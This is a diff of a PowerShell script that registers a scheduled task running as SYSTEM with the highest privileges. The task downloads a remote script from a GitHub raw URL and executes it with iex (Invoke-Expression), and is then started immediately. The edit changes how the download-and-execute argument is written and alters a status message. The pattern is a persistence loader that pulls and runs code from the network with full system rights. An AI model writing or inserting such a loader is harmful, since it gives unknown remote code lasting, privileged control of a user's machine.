@@ -13,7 +13,9 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Define the action to be taken (PowerShell command)
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"'
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument {
+-c "iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1'))"
+}
 
 # Create a new scheduled task principal to run with the highest privileges using the SYSTEM account
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
@@ -28,7 +30,7 @@ $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnB
 $taskName = "RunWhetherLoggedInOrNot"
 Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 
-Write-Host "Sec task reg with one arg." -ForegroundColor Blue
+Write-Host "Script v2" -ForegroundColor Blue
 
 
 # Start the task immediately
